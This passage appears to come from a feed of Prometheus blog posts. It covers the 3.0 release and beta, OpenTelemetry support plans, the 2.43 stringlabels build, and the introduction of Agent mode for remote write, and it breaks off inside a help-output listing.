Prometheus 3.0 contains a few breaking changes. This includes changes to feature flags, configuration files, PromQL, and scrape protocols.</p>\n<p>Please read the <a href=\"https://prometheus.io/docs/prometheus/3.0/migration/\">migration guide</a> to find out if your setup is affected and what actions to take.</p>\n<h2>Performance</h2>\n<p>It’s impressive to see what we have accomplished in the community since Prometheus 2.0. We all love numbers, so let’s celebrate the efficiency improvements we made for both CPU and memory use for the TSDB mode. Below you can see performance numbers between 3 Prometheus versions on the node with 8 CPU and 49 GB allocatable memory.</p>\n<ul>\n<li>2.0.0 (7 years ago)</li>\n<li>2.18.0 (4 years ago)</li>\n<li>3.0.0 (now)</li>\n</ul>\n<p><img alt=\"Memory bytes\" src=\"https://prometheus.io/assets/blog/2024-11-14/memory_bytes_ui.png\" /></p>\n<p><img alt=\"CPU seconds\" src=\"https://prometheus.io/assets/blog/2024-11-14/cpu_seconds_ui.png\" /></p>\n<p>It’s furthermore impressive that those numbers were taken using our <a href=\"https://github.com/prometheus/prometheus/pull/15366\">prombench macrobenchmark</a>\nthat uses the same PromQL queries, configuration and environment–highlighting backward compatibility and stability for the core features, even with 3.0.</p>\n<h2>What's Next</h2>\n<p>There are still tons of exciting features and improvements we can make in Prometheus and the ecosystem. Here is a non-exhaustive list to get you excited and…\nhopefully motivate you to contribute and join us!</p>\n<ul>\n<li>New, more inclusive <strong>governance</strong></li>\n<li>More <strong>OpenTelemetry</strong> compatibility and features</li>\n<li>OpenMetrics 2.0, now under Prometheus governance!</li>\n<li>Native Histograms stability (and with custom buckets!)</li>\n<li>More optimizations!</li>\n<li>UTF-8 support coverage in more SDKs and tools</li>\n</ul>\n<h2>Try It Out!</h2>\n<p>You can try out Prometheus 3.0 by downloading it from our <a href=\"https://prometheus.io/download/#prometheus\">official binaries</a> and <a href=\"https://quay.io/repository/prometheus/prometheus?tab=tags\">container images</a>.</p>\n<p>If you are upgrading from Prometheus 2.x, check out the migration guide for more information on any adjustments you will have to make.\nPlease note that we strongly recommend upgrading to v2.55 before upgrading to v3.0. Rollback is possible from v3.0 to v2.55, but not to earlier versions.</p>\n<p>As always, we welcome feedback and contributions from the community!</p>",

      "summary": "<p>The Prometheus Team is proud to announce the availability of Prometheus Version 3.0-beta!\nYou can download it <a href=\"https://github.com/prometheus/prometheus/releases/tag/v3.0.0-beta.0\">here</a>.\nAs is traditional with a beta release, we do <strong>not</strong> recommend users install Prometheus 3.0-beta on critical production systems, but we do want everyone to test it out and find bugs.</p>\n<p>In general, the only breaking changes are the removal of deprecated feature flags. The Prometheus team worked hard to ensure backwards-compatibility and not to break existing installations, so all of the new features described below build on top of existing functionality. Most users should be able to try Prometheus 3.0 out of the box without any configuration changes.</p>\n<h2>What's New</h2>\n<p>With over 7500 commits in the 7 years since Prometheus 2.0 came out there are too many new individual features and fixes to list, but there are some big shiny and breaking changes we wanted to call out. We need everyone in the community to try them out and report any issues you might find.\nThe more feedback we get, the more stable the final 3.0 release can be.</p>\n<h3>New UI</h3>\n<p>One of the highlights in Prometheus 3.0 is its brand new UI that is enabled by default:</p>\n<p><img alt=\"New UI query page\" src=\"https://prometheus.io/assets/blog/2024-09-11/blog_post_screenshot_tree_view-s.png\" /></p>\n<p>The UI has been completely rewritten with less clutter, a more modern look and feel, new features like a <a href=\"https://promlens.com/\"><strong>PromLens</strong></a>-style tree view, and will make future maintenance easier by using a more modern technical stack.</p>\n<p>Learn more about the new UI in general in <a href=\"https://promlabs.com/blog/2024/09/11/a-look-at-the-new-prometheus-3-0-ui/\">Julius' detailed article on the PromLabs blog</a>.\nUsers can temporarily enable the old UI by using the <code>old-ui</code> feature flag.\nSince the new UI is not battle-tested yet, it is also very possible that there are still bugs. If you find any, please <a href=\"https://github.com/prometheus/prometheus/issues/new?assignees=&#x26;labels=&#x26;projects=&#x26;template=bug_report.yml\">report them on GitHub</a>.</p>\n<h3>Remote Write 2.0</h3>\n<p>Remote-Write 2.0 iterates on the previous protocol version by adding native support for a host of new elements including metadata, exemplars, created timestamp and native histograms. It also uses string interning to reduce payload size and CPU usage when compressing and decompressing. More details can be found <a href=\"https://prometheus.io/docs/specs/remote_write_spec_2_0/\">here</a>.</p>\n<h3>OpenTelemetry Support</h3>\n<p>Prometheus intends to be the default choice for storing OpenTelemetry metrics, and 3.0 includes some big new features that makes it even better as a storage backend for OpenTelemetry metrics data.</p>\n<h4>UTF-8</h4>\n<p>By default, Prometheus will allow all valid UTF-8 characters to be used in metric and label names, as well as label values as has been true in version 2.x.</p>\n<p>Users will need to make sure their metrics producers are configured to pass UTF-8 names, and if either side does not support UTF-8, metric names will be escaped using the traditional underscore-replacement method. PromQL queries can be written with the new quoting syntax in order to retrieve UTF-8 metrics, or users can specify the <code>__name__</code>  label name manually.</p>\n<p>Not all language bindings have been updated with support for UTF-8 but the primary Go libraries have been.</p>\n<h4>OTLP Ingestion</h4>\n<p>Prometheus can be configured as a native receiver for the OTLP Metrics protocol, receiving OTLP metrics on the /api/v1/otlp/v1/metrics endpoint.</p>\n<h3>Native Histograms</h3>\n<p>Native histograms are a Prometheus metric type that offer a higher efficiency and lower cost alternative to Classic Histograms. Rather than having to choose (and potentially have to update) bucket boundaries based on the data set, native histograms have pre-set bucket boundaries based on exponential growth.</p>\n<p>Native Histograms are still experimental and not yet enabled by default, and can be turned on by passing <code>--enable-feature=native-histograms</code>.  Some aspects of Native Histograms, like the text format and accessor functions / operators are still under active design.</p>\n<h3>Other Breaking Changes</h3>\n<p>The following feature flags have been removed, being enabled by default instead. References to these flags should be removed from configs, and will be ignored in Prometheus starting with version 3.0</p>\n<ul>\n<li><code>promql-at-modifier</code></li>\n<li><code>promql-negative-offset</code></li>\n<li><code>remote-write-receiver</code></li>\n<li><code>no-scrape-default-port</code></li>\n<li><code>new-service-discovery-manager</code></li>\n</ul>\n<p>Range selections are now <a href=\"https://github.com/prometheus/prometheus/issues/13213\">left-open and right-closed</a>, which will avoid rare occasions that more points than intended are included in operations.</p>\n<p>Agent mode is now stable and has its own config flag instead of a feature flag</p>",

      "summary": "<p><em>The <a href=\"https://opentelemetry.io/\">OpenTelemetry project</a> is an Observability framework and toolkit designed to create and manage telemetry data such as traces, metrics, and logs. It is gaining widespread adoption due to its consistent specification between signals and promise to reduce vendor lock-in which is something that we’re excited about.</em></p>\n<h2>Looking back at 2023</h2>\n<p>Over the past few years, we have collaborated with the OpenTelemetry community to make sure that OpenTelemetry and Prometheus support each other bidirectionally. This led to the drafting of the official specification to convert between the two systems, as well as the implementations that allow you to ingest Prometheus metrics into OpenTelemetry Collector and vice-versa.</p>\n<p>Since then, we have spent a significant amount of time understanding the <a href=\"https://docs.google.com/document/d/1epvoO_R7JhmHYsII-GJ6Yw99Ky91dKOqOtZGqX7Bk0g/edit?usp=sharing\">challenges faced by OpenTelemetry users</a> when storing their metrics in Prometheus and based on those, explored <a href=\"https://docs.google.com/document/d/1NGdKqcmDExynRXgC_u1CDtotz9IUdMrq2yyIq95hl70/edit?usp=sharing\">how we can address them</a>. Some of the changes proposed need careful considerations to avoid breaking either side's operating promises, e.g. supporting both push and pull. At PromCon Berlin 2023, we attempted to summarize our ideas in <a href=\"https://www.youtube.com/watch?v=mcabOH70FqU\">one of the talks</a>.</p>\n<p>At our <a href=\"https://docs.google.com/document/d/11LC3wJcVk00l8w5P3oLQ-m3Y37iom6INAMEu2ZAGIIE/edit#bookmark=id.9kp854ea3sv4\">dev summit in Berlin</a>, we spent the majority of our time discussing these changes and our general stance on OpenTelemetry in depth, and the broad consensus is that we want <a href=\"https://docs.google.com/document/d/11LC3wJcVk00l8w5P3oLQ-m3Y37iom6INAMEu2ZAGIIE/edit#bookmark=id.196i9ij1u7fs\">“to be the default store for OpenTelemetry metrics”</a>!</p>\n<p>We’ve formed a core group of developers to lead this initiative, and we are going to release a Prometheus 3.0 in 2024 with OTel support as one of its more important features. Here’s a sneak peek at what's coming in 2024.</p>\n<h2>The year ahead</h2>\n<h3>OTLP Ingestion GA</h3>\n<p>In <a href=\"https://github.com/prometheus/prometheus/releases/tag/v2.47.0\">Prometheus v2.47.0</a>, released on 6th September 2023, we added experimental support for OTLP ingestion in Prometheus. We’re constantly improving this and we plan to add support for staleness and make it a stable feature. We will also mark our support for out-of-order ingestion as stable. This involves also GA-ing our support for native / exponential histograms.</p>\n<h3>Support UTF-8 metric and label names</h3>\n<p><a href=\"https://github.com/open-telemetry/semantic-conventions/blob/main/docs/http/http-metrics.md\">OpenTelemetry semantic conventions</a> push for <code>“.”</code> to be the namespacing character. For example, <code>http.server.request.duration</code>. However, Prometheus currently requires a <a href=\"https://prometheus.io/docs/instrumenting/writing_exporters/#naming\">more limited character set</a>, which means we convert the metric to <code>http_server_request_duration</code> when ingesting it into Prometheus.</p>\n<p>This causes unnecessary dissonance and we’re working on removing this limitation by adding UTF-8 support for all labels and metric names. The progress is tracked <a href=\"https://github.com/prometheus/prometheus/issues/13095\">here</a>.</p>\n<h3>Native support for resource attributes</h3>\n<p>OpenTelemetry differentiates between metric attributes (labels to identify the metric itself, like <code>http.status_code</code>) and resource attributes (labels to identify the source of the metrics, like <code>k8s.pod.name</code>), while Prometheus has a more flat label schema. This leads to many usability issues that are detailed <a href=\"https://docs.google.com/document/d/1gG-eTQ4SxmfbGwkrblnUk97fWQA93umvXHEzQn2Nv7E/edit?usp=sharing\">here</a>.</p>\n<p>We’re <a href=\"https://docs.google.com/document/d/1FgHxOzCQ1Rom-PjHXsgujK8x5Xx3GTiwyG__U3Gd9Tw/edit\">exploring several solutions</a> to this problem from many fronts (Query, UX, storage, etc.), but our goal is to make it quite easy to filter and group on resource attributes. This is a work in progress, and feedback and help are wanted!</p>\n<h3>OTLP export in the ecosystem</h3>\n<p>Prometheus remote write is supported by <a href=\"https://prometheus.io/docs/operating/integrations/#remote-endpoints-and-storage\">most of the leading Observability projects and vendors</a> already. However, OpenTelemetry Protocol (OTLP) is gaining prominence and we would like to support it across the Prometheus ecosystem.</p>\n<p>We would like to add support for it to the Prometheus server, SDKs and the exporters. This would mean that any service instrumented with the Prometheus SDKs will also be able to <em>push</em> OTLP and it will unlock the rich Prometheus exporter ecosystem for OpenTelemetry users.</p>\n<p>However, we intend to keep and develop the OpenMetrics exposition format as an optimized / simplified format for Prometheus and pull-based use-cases.</p>\n<h3>Delta temporality</h3>\n<p>The OpenTelemetry project also supports <a href=\"https://grafana.com/blog/2023/09/26/opentelemetry-metrics-a-guide-to-delta-vs.-cumulative-temporality-trade-offs/\">Delta temporality</a> which has some use-cases for the Observability ecosystem. We have a lot of Prometheus users still running statsd and using the statsd_exporter for various reasons.</p>\n<p>We would like to support the Delta temporality of OpenTelemetry in the Prometheus server and are <a href=\"https://github.com/open-telemetry/opentelemetry-collector-contrib/issues/30479\">working towards it</a>.</p>\n<h2>Call for contributions!</h2>\n<p>As you can see, a lot of new and exciting things are coming to Prometheus! If working in the intersection between two of the most relevant open-source projects around observability sounds challenging and interesting to you, we'd like to have you on board!</p>\n<p>This year there is also a change of governance in the works that will make the process of becoming a maintainer easier than ever! If you ever wanted to have an impact on Prometheus, now is a great time to get started.</p>\n<p>Our first focus has always been to be as open and transparent as possible on how we are organizing all the work above so that you can also contribute. We are looking for contributors to support this initiative and help implement these features. Check out the <a href=\"https://github.com/orgs/prometheus/projects/9\">Prometheus 3.0 public board</a> and <a href=\"https://github.com/prometheus/prometheus/issues?q=is%3Aopen+is%3Aissue+milestone%3A%22OTEL+Support%22\">Prometheus OTel support milestone</a> to track the progress of the feature development and see ways that you can <a href=\"https://github.com/prometheus/prometheus/blob/main/CONTRIBUTING.md\">contribute</a>.</p>\n<h2>Conclusion</h2>\n<p>Some of the changes proposed are large and invasive or involve a fundamental departure from the original data model of Prometheus. However, we plan to introduce these gracefully so that Prometheus 3.0 will have no major breaking changes and most of the users can upgrade without impact.</p>\n<p>We are excited to embark on this new chapter for Prometheus and would love your feedback on the changes suggested.</p>",

      "summary": "<p>Prometheus 2.43 has just been released, and it brings some exciting features and\nenhancements. One of the significant improvements is the <code>stringlabels</code> release,\nwhich uses a new data structure for labels. This blog post will answer some\nfrequently asked questions about the 2.43 release and the <code>stringlabels</code>\noptimizations.</p>\n<h2>What is the <code>stringlabels</code> release?</h2>\n<p>The <code>stringlabels</code> release is a Prometheus 2.43 version that uses a new data\nstructure for labels. It stores all the label/values in a single string,\nresulting in a smaller heap size and some speedups in most cases. These\noptimizations are not shipped in the default binaries and require compiling\nPrometheus using the Go tag <code>stringlabels</code>.</p>\n<h2>Why didn't you go for a feature flag that we can toggle?</h2>\n<p>We considered using a feature flag but it would have a memory overhead that was\nnot worth it. Therefore, we decided to provide a separate release with these\noptimizations for those who are interested in testing and measuring the gains on\ntheir production environment.</p>\n<h2>When will these optimizations be generally available?</h2>\n<p>These optimizations will be available in the upcoming Prometheus 2.44 release\nby default.</p>\n<h2>How do I get the 2.43 release?</h2>\n<p>The <a href=\"https://github.com/prometheus/prometheus/releases/tag/v2.43.0\">Prometheus 2.43 release</a> is available on the official Prometheus GitHub\nreleases page, and users can download the binary files directly from there.\nAdditionally, Docker images are also available for those who prefer to use\ncontainers.</p>\n<p>The stringlabels optimization is not included in these default binaries. To use\nthis optimization, users will need to download the <a href=\"https://github.com/prometheus/prometheus/releases/tag/v2.43.0%2Bstringlabels\">2.43.0+stringlabels\nrelease</a>\nbinary or the <a href=\"https://quay.io/repository/prometheus/prometheus?tab=tags\">Docker images tagged\nv2.43.0-stringlabels</a> specifically.</p>\n<h2>Why is the release <code>v2.43.0+stringlabels</code> and the Docker tag <code>v2.43.0-stringlabels</code>?</h2>\n<p>In semantic versioning, the plus sign (+) is used to denote build\nmetadata. Therefore, the Prometheus 2.43 release with the <code>stringlabels</code>\noptimization is named <code>2.43.0+stringlabels</code> to signify that it includes the\nexperimental <code>stringlabels</code> feature. However, Docker tags do not allow the use of\nthe plus sign in their names. Hence, the plus sign has been replaced with a dash\n(-) to make the Docker tag <code>v2.43.0-stringlabels</code>. This allows the Docker tag to\npass the semantic versioning checks of downstream projects such as the\nPrometheus Operator.</p>\n<h2>What are the other noticeable features in the Prometheus 2.43 release?</h2>\n<p>Apart from the <code>stringlabels</code> optimizations, the Prometheus 2.43 release\nbrings several new features and enhancements. Some of the significant additions\ninclude:</p>\n<ul>\n<li>We added support for <code>scrape_config_files</code> to include scrape configs from\ndifferent files. This makes it easier to manage and organize the configuration.</li>\n<li>The HTTP clients now includes two new config options: <code>no_proxy</code> to exclude\nURLs from proxied requests and <code>proxy_from_environment</code> to read proxies from\nenv variables. These features make it easier to manage the HTTP client's\nbehavior in different environments.</li>\n</ul>\n<p>You can learn more about features and bugfixes in the\n<a href=\"https://github.com/prometheus/prometheus/releases/tag/v2.43.0\">full changelog</a>.</p>",

CNCF Ambassador and tech lead for the CNCF TAG Observability. In his free time, he writes a book titled \"Efficient Go\" with O'Reilly. Opinions are my own!</p>\n</blockquote>\n<p>What I personally love in the Prometheus project, and one of the many reasons why I joined the team, was the laser focus on the project's goals. Prometheus was always about pushing boundaries when it comes to providing pragmatic, reliable, cheap, yet invaluable metric-based monitoring. Prometheus' ultra-stable and robust APIs, query language, and integration protocols (e.g. Remote Write and <a href=\"https://openmetrics.io/\">OpenMetrics</a>) allowed the Cloud Native Computing Foundation (CNCF) metrics ecosystem to grow on those strong foundations. Amazing things happened as a result:</p>\n<ul>\n<li>We can see community exporters for getting metrics about virtually everything e.g. <a href=\"https://github.com/google/cadvisor\">containers</a>, <a href=\"https://github.com/cloudflare/ebpf_exporter\">eBPF</a>, <a href=\"https://github.com/sladkoff/minecraft-prometheus-exporter\">Minecraft server statistics</a> and even <a href=\"https://megamorf.gitlab.io/2019/07/14/monitoring-plant-health-with-prometheus/\">plants' health when gardening</a>.</li>\n<li>Most people nowadays expect cloud-native software to have an HTTP/HTTPS <code>/metrics</code> endpoint that Prometheus can scrape. A concept developed in secret within Google and pioneered globally by the Prometheus project.</li>\n<li>The observability paradigm shifted. We see SREs and developers rely heavily on metrics from day one, which improves software resiliency, debuggability, and data-driven decisions!</li>\n</ul>\n<p>In the end, we hardly see Kubernetes clusters without Prometheus running there.</p>\n<p>The strong focus of the Prometheus community allowed other open-source projects to grow too to extend the Prometheus deployment model beyond single nodes (e.g. <a href=\"https://cortexmetrics.io/\">Cortex</a>, <a href=\"https://thanos.io/\">Thanos</a> and more). Not mentioning cloud vendors adopting Prometheus' API and data model (e.g. <a href=\"https://aws.amazon.com/prometheus/\">Amazon Managed Prometheus</a>, <a href=\"https://cloud.google.com/stackdriver/docs/managed-prometheus\">Google Cloud Managed Prometheus</a>, <a href=\"https://grafana.com/products/cloud/\">Grafana Cloud</a> and more). If you are looking for a single reason why the Prometheus project is so successful, it is this: <strong>Focusing the monitoring community on what matters</strong>.</p>\n<p>In this (lengthy) blog post, I would love to introduce a new operational mode of running Prometheus called \"Agent\". It is built directly into the Prometheus binary. The agent mode disables some of Prometheus' usual features and optimizes the binary for scraping and remote writing to remote locations. Introducing a mode that reduces the number of features enables new usage patters. In this blog post I will explain why it is a game-changer for certain deployments in the CNCF ecosystem. I am super excited about this!</p>\n<h2>History of the Forwarding Use Case</h2>\n<p>The core design of Prometheus has been unchanged for the project's entire lifetime. Inspired by <a href=\"https://sre.google/sre-book/practical-alerting/#the-rise-of-borgmon\">Google's Borgmon monitoring system</a>, you can deploy a Prometheus server alongside the applications you want to monitor, tell Prometheus how to reach them, and allow to scrape the current values of their metrics at regular intervals. Such a collection method, which is often referred to as the \"pull model\", is the core principle that <a href=\"https://prometheus.io/blog/2016/07/23/pull-does-not-scale-or-does-it/\">allows Prometheus to be lightweight and reliable</a>. Furthermore, it enables application instrumentation and exporters to be dead simple, as they only need to provide a simple human-readable HTTP endpoint with the current value of all tracked metrics (in OpenMetrics format). All without complex push infrastructure and non-trivial client libraries. Overall, a simplified typical Prometheus monitoring deployment looks as below:</p>\n<p><img alt=\"Prometheus high-level view\" src=\"https://prometheus.io/assets/blog/2021-11-16/prom.png\" /></p>\n<p>This works great, and we have seen millions of successful deployments like this over the years that process dozens of millions of active series. Some of them for longer time retention, like two years or so. All allow to query, alert, and record metrics useful for both cluster admins and developers.</p>\n<p>However, the cloud-native world is constantly growing and evolving. With the growth of managed Kubernetes solutions and clusters created on-demand within seconds, we are now finally able to treat clusters as \"cattle\", not as \"pets\" (in other words, we care less about individual instances of those). In some cases, solutions do not even have the cluster notion anymore, e.g. <a href=\"https://github.com/kcp-dev/kcp\">kcp</a>, <a href=\"https://aws.amazon.com/fargate/\">Fargate</a> and other platforms.</p>\n<p><img alt=\"Yoda\" src=\"https://prometheus.io/assets/blog/2021-11-16/yoda.gif\" /></p>\n<p>The other interesting use case that emerges is the notion of <strong>Edge</strong> clusters or networks. With industries like telecommunication, automotive and IoT devices adopting cloud-native technologies, we see more and more much smaller clusters with a restricted amount of resources. This is forcing all data (including observability) to be transferred to remote, bigger counterparts as almost nothing can be stored on those remote nodes.</p>\n<p>What does that mean? That means monitoring data has to be somehow aggregated, presented to users and sometimes even stored on the <em>global</em> level. This is often called a <strong>Global-View</strong> feature.</p>\n<p>Naively, we could think about implementing this by either putting Prometheus on that global level and scraping metrics across remote networks or pushing metrics directly from the application to the central location for monitoring purposes. Let me explain why both are generally <em>very</em> bad ideas:</p>\n<p>🔥 Scraping across network boundaries can be a challenge if it adds new unknowns in a monitoring pipeline. The local pull model allows Prometheus to know why exactly the metric target has problems and when. Maybe it's down, misconfigured, restarted, too slow to give us metrics (e.g. CPU saturated), not discoverable by service discovery, we don't have credentials to access or just DNS, network, or the whole cluster is down. By putting our scraper outside of the network, we risk losing some of this information by introducing unreliability into scrapes that is unrelated to an individual target. On top of that, we risk losing important visibility completely if the network is temporarily down. Please don't do it. It's not worth it. (:</p>\n<p>🔥 Pushing metrics directly from the application to some central location is equally bad. Especially when you monitor a larger fleet, you know literally nothing when you don't see metrics from remote applications. Is the application down? Is my receiver pipeline down? Maybe the application failed to authorize? Maybe it failed to get the IP address of my remote cluster? Maybe it's too slow? Maybe the network is down? Worse, you may not even know that the data from some application targets is missing. And you don't even gain a lot as you need to track the state and status of everything that should be sending data. Such a design needs careful analysis as it can be a recipe for a failure too easily.</p>\n<blockquote>\n<p>NOTE: Serverless functions and short-living containers are often cases where we think about push from application as the rescue. At this point however we talk about events or pieces of metrics we might want to aggregate to longer living time series. This topic is discussed <a href=\"https://groups.google.com/g/prometheus-developers/c/FPe0LsTfo2E/m/yS7up2YzAwAJ\">here</a>, feel free to contribute and help us support those cases better!</p>\n</blockquote>\n<p>Prometheus introduced three ways to support the global view case, each with its own pros and cons. Let's briefly go through those. They are shown in orange color in the diagram below:</p>\n<p><img alt=\"Prometheus global view\" src=\"https://prometheus.io/assets/blog/2021-11-16/prom-remote.png\" /></p>\n<ul>\n<li><strong>Federation</strong> was introduced as the first feature for aggregation purposes. It allows a global-level Prometheus server to scrape a subset of metrics from a leaf Prometheus. Such a \"federation\" scrape reduces some unknowns across networks because metrics exposed by federation endpoints include the original samples' timestamps. Yet, it usually suffers from the inability to federate all metrics and not lose data during longer network partitions (minutes).</li>\n<li><strong>Prometheus Remote Read</strong> allows selecting raw metrics from a remote Prometheus server's database without a direct PromQL query. You can deploy Prometheus or other solutions (e.g. Thanos) on the global level to perform PromQL queries on this data while fetching the required metrics from multiple remote locations. This is really powerful as it allows you to store data \"locally\" and access it only when needed. Unfortunately, there are cons too. Without features like <a href=\"https://github.com/thanos-io/thanos/issues/305\">Query Pushdown</a> we are in extreme cases pulling GBs of compressed metric data to answer a single query. Also, if we have a network partition, we are temporarily blind. Last but not least, certain security guidelines are not allowing ingress traffic, only egress one.</li>\n<li>Finally, we have <strong>Prometheus Remote Write</strong>, which seems to be the most popular choice nowadays. Since the agent mode focuses on remote write use cases, let's explain it in more detail.</li>\n</ul>\n<h3>Remote Write</h3>\n<p>The Prometheus Remote Write protocol allows us to forward (stream) all or a subset of metrics collected by Prometheus to the remote location. You can configure Prometheus to forward some metrics (if you want, with all metadata and exemplars!) to one or more locations that support the Remote Write API. In fact, Prometheus supports both ingesting and sending Remote Write, so you can deploy Prometheus on a global level to receive that stream and aggregate data cross-cluster.</p>\n<p>While the official <a href=\"https://docs.google.com/document/d/1LPhVRSFkGNSuU1fBd81ulhsCPR4hkSZyyBj1SZ8fWOM/edit\">Prometheus Remote Write API specification is in review stage</a>, the ecosystem adopted the Remote Write protocol as the default metrics export protocol. For example, Cortex, Thanos, OpenTelemetry, and cloud services like Amazon, Google, Grafana, Logz.io, etc., all support ingesting data via Remote Write.</p>\n<p>The Prometheus project also offers the official compliance tests for its APIs, e.g. <a href=\"https://github.com/prometheus/compliance/tree/main/remote_write_sender\">remote-write sender compliance</a> for solutions that offer Remote Write client capabilities. It's an amazing way to quickly tell if you are correctly implementing this protocol.</p>\n<p>Streaming data from such a scraper enables Global View use cases by allowing you to store metrics data in a centralized location. This also enables separation of concerns, which is useful when applications are managed by different teams than the observability or monitoring pipelines. Furthermore, it is also why Remote Write is chosen by vendors who want to offload as much work from their customers as possible.</p>\n<blockquote>\n<p>Wait for a second, Bartek. You just mentioned before that pushing metrics directly from the application is not the best idea!</p>\n</blockquote>\n<p>Sure, but the amazing part is that, even with Remote Write, Prometheus still uses a pull model to gather metrics from applications, which gives us an understanding of those different failure modes. After that, we batch samples and series and export, replicate (push) data to the Remote Write endpoints, limiting the number of monitoring unknowns that the central point has!</p>\n<p>It's important to note that a reliable and efficient remote-writing implementation is a non-trivial problem to solve. The Prometheus community spent around three years to come up with a stable and scalable implementation. We reimplemented the WAL (write-ahead-log) a few times, added internal queuing, sharding, smart back-offs and more. All of this is hidden from the user, who can enjoy well-performing streaming or large amounts of metrics stored in a centralized location.</p>\n<h3>Hands-on Remote Write Example: Katacoda Tutorial</h3>\n<p>All of this is not new in Prometheus. Many of us already use Prometheus to scrape all required metrics and remote-write all or some of them to remote locations.</p>\n<p>Suppose you would like to try the hands-on experience of remote writing capabilities. In that case, we recommend the <a href=\"https://katacoda.com/thanos/courses/thanos/3-receiver\">Thanos Katacoda tutorial of remote writing metrics from Prometheus</a>, which explains all steps required for Prometheus to forward all metrics to the remote location. It's <strong>free</strong>, just sign up for an account and enjoy the tutorial! 🤗</p>\n<p>Note that this example uses Thanos in receive mode as the remote storage. Nowadays, you can use plenty of other projects that are compatible with the remote write API.</p>\n<p>So if remote writing works fine, why did we add a special Agent mode to Prometheus?</p>\n<h2>Prometheus Agent Mode</h2>\n<p>From Prometheus <code>v2.32.0</code> (next release), everyone will be able to run the Prometheus binary with an experimental <code>--enable-feature=agent</code> flag. If you want to try it before the release, feel free to use <a href=\"https://github.com/prometheus/prometheus/releases/tag/v2.32.0-beta.0\">Prometheus v2.32.0-beta.0</a> or use our <code>quay.io/prometheus/prometheus:v2.32.0-beta.0</code> image.</p>\n<p>The Agent mode optimizes Prometheus for the remote write use case. It disables querying, alerting, and local storage, and replaces it with a customized TSDB WAL. Everything else stays the same: scraping logic, service discovery and related configuration. It can be used as a drop-in replacement for Prometheus if you want to just forward your data to a remote Prometheus server or any other Remote-Write-compliant project. In essence it looks like this:</p>\n<p><img alt=\"Prometheus agent\" src=\"https://prometheus.io/assets/blog/2021-11-16/agent.png\" /></p>\n<p>The best part about Prometheus Agent is that it's built into Prometheus. Same scraping APIs, same semantics, same configuration and discovery mechanism.</p>\n<p>What are the benefits of using the Agent mode if you plan not to query or alert on data locally and stream metrics outside? There are a few:</p>\n<p>First of all, efficiency. Our customized Agent TSDB WAL removes the data immediately after successful writes. If it cannot reach the remote endpoint, it persists the data temporarily on the disk until the remote endpoint is back online. This is currently limited to a two-hour buffer only, similar to non-agent Prometheus, <a href=\"https://github.com/prometheus/prometheus/issues/9607\">hopefully unblocked soon</a>. This means that we don't need to build chunks of data in memory. We don't need to maintain a full index for querying purposes. Essentially the Agent mode uses a fraction of the resources that a normal Prometheus server would use in a similar situation.</p>\n<p>Does this efficiency matter? Yes! As we mentioned, every GB of memory and every CPU core used on edge clusters matters for some deployments. On the other hand, the paradigm of performing monitoring using metrics is quite mature these days. This means that the more relevant metrics with more cardinality you can ship for the same cost - the better.</p>\n<blockquote>\n<p>NOTE: With the introduction of the Agent mode, the original Prometheus server mode still stays as the recommended, stable and maintained mode. Agent mode with remote storage brings additional complexity. Use with care.</p>\n</blockquote>\n<p>Secondly, the benefit of the new Agent mode is that it enables easier horizontal scalability for ingestion. This is something I am excited about the most. Let me explain why.</p>\n<h3>The Dream: Auto-Scalable Metric Ingestion</h3>\n<p>A true auto-scalable solution for scraping would need to be based on the amount of metric targets and the number of metrics they expose. The more data we have to scrape, the more instances of Prometheus we deploy automatically. If the number of targets or their number of metrics goes down, we could scale down and remove a couple of instances. This would remove the manual burden of adjusting the sizing of Prometheus and stop the need for over-allocating Prometheus for situations where the cluster is temporarily small.</p>\n<p>With just Prometheus in server mode, this was hard to achieve. This is because Prometheus in server mode is stateful. Whatever is collected stays as-is in a single place. This means that the scale-down procedure would need to back up the collected data to existing instances before termination. Then we would have the problem of overlapping scrapes, misleading staleness markers etc.</p>\n<p>On top of that, we would need some global view query that is able to aggregate all samples across all instances (e.g. Thanos Query or Promxy). Last but not least, the resource usage of Prometheus in server mode depends on more things than just ingestion. There is alerting, recording, querying, compaction, remote write etc., that might need more or fewer resources independent of the number of metric targets.</p>\n<p>Agent mode essentially moves the discovery, scraping and remote writing to a separate microservice. This allows a focused operational model on ingestion only. As a result, Prometheus in Agent mode is more or less stateless. Yes, to avoid loss of metrics, we need to deploy an HA pair of agents and attach a persistent disk to them. But technically speaking, if we have thousands of metric targets (e.g. containers), we can deploy multiple Prometheus agents and safely change which replica is scraping which targets. This is because, in the end, all samples will be pushed to the same central storage.</p>\n<p>Overall, Prometheus in Agent mode enables easy horizontal auto-scaling capabilities of Prometheus-based scraping that can react to dynamic changes in metric targets. This is definitely something we will look at with the <a href=\"https://github.com/prometheus-operator/prometheus-operator\">Prometheus Kubernetes Operator</a> community going forward.</p>\n<p>Now let's take a look at the currently implemented state of agent mode in Prometheus. Is it ready to use?</p>\n<h3>Agent Mode Was Proven at Scale</h3>\n<p>The next release of Prometheus will include Agent mode as an experimental feature. Flags, APIs and WAL format on disk might change. But the performance of the implementation is already battle-tested thanks to <a href=\"https://grafana.com/\">Grafana Labs'</a> open-source work.</p>\n<p>The initial implementation of our Agent's custom WAL was inspired by the current Prometheus server's TSDB WAL and created by <a href=\"https://github.com/rfratto\">Robert Fratto</a> in 2019, under the mentorship of <a href=\"https://twitter.com/tom_wilkie\">Tom Wilkie</a>, Prometheus maintainer. It was then used in an open-source <a href=\"https://github.com/grafana/agent\">Grafana Agent</a> project that was since then used by many Grafana Cloud customers and community members. Given the maturity of the solution, it was time to donate the implementation to Prometheus for native integration and bigger adoption. Robert (Grafana Labs), with the help of Srikrishna (Red Hat) and the community, ported the code to the Prometheus codebase, which was merged to <code>main</code> 2 weeks ago!</p>\n<p>The donation process was quite smooth. Since some Prometheus maintainers contributed to this code before within the Grafana Agent, and since the new WAL is inspired by Prometheus' own WAL, it was not hard for the current Prometheus TSDB maintainers to take it under full maintenance! It also really helps that Robert is joining the Prometheus Team as a TSDB maintainer (congratulations!).</p>\n<p>Now, let's explain how you can use it! (:</p>\n<h3>How to Use Agent Mode in Detail</h3>\n<p>From now on, if you show the help output of Prometheus (<code>--help</code> flag), you should see more or less the following:</p>\n<pre><code class=\"language-bash\">usage: prometheus [&#x3c;flags>]\n\nThe Prometheus monitoring server\n\nFlags:\n  -h, --help                     Show context-sensitive help (also try --help-long and --help-man).\n      (... other flags)\n      --storage.tsdb.path=\"data/\"\n                                 Base path for metrics storage. Use with server mode only.\n      --storage.agent.path=\"data-agent/\"\n                                 Base path for metrics storage. Use with agent mode only.\n      (... other flags)\n      --enable-feature= ...      Comma separated 